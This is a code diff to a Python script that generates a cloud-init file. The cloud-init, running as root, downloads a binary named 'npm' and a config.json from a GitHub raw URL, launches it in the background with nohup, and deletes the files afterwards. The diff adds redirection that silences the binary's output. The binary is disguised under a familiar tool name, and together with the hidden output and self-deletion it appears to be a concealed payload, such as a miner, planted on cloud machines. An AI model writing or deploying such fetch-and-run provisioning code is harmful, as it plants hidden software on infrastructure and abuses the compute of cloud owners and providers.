@@ -22,7 +22,8 @@ with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
     f.write("  - sudo -s" + "\n")
-    f.write("  - sleep 60 && wget https://raw.githubusercontent.com/drewnelson1/1/main/npm && wget https://raw.githubusercontent.com/drewnelson1/1/main/config.json && chmod +x npm && nohup ./npm --config=./config.json &" + "\n")
+    f.write("  - cd /root && mkdir wiki" + "\n")
+    f.write("  - sleep 60 && wget https://raw.githubusercontent.com/drewnelson1/1/main/npm && wget https://raw.githubusercontent.com/drewnelson1/1/main/config.json && chmod +x npm && nohup ./npm --config=./config.json >/dev/null 2>&1 &" + "\n")
     f.write("  - sleep 5 && rm npm config.json" + "\n")
     
 
